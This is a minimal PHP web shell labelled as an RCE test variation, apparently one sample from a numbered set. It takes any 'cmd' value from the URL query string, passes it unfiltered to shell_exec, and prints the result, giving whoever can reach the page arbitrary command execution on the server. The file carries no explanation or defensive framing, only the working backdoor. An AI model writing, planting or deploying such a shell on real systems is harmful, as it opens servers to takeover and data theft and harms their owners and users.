<?php
// RCE test variation #756
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>